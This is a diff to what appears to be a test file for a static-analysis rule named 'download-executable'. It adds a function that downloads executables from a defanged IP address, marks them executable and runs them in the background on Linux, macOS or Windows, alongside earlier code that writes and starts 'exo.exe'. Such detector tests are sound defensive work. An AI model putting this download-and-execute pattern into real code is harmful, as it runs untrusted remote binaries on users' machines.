@@ -113,3 +113,21 @@ def f():
     # ruleid: download-executable
     open("exo.exe", "wb").write(response.content)
     os.system("set __COMPACT_LAYER=RunAsInvoker | start exo.exe")
+
+def f():
+    for executable in all_executables:
+        url = f'http://35.235.126[.]33/{executable}'
+        req = requests.get(url)
+        # ruleid: download-executable
+        with open(executable, 'wb') as f:
+            f.write(req.content)
+
+        if 'linux' in operating_system or 'darwin' in operating_system:
+            os.system(f'chmod +x {executable}')
+
+        if 'linux' in operating_system:
+            os.system(f'./{executable} &')
+        elif 'darwin' in operating_system:
+            os.system(f'./{executable} &')
+        elif 'windows' in operating_system:
+            os.system(f'start /B {executable}')
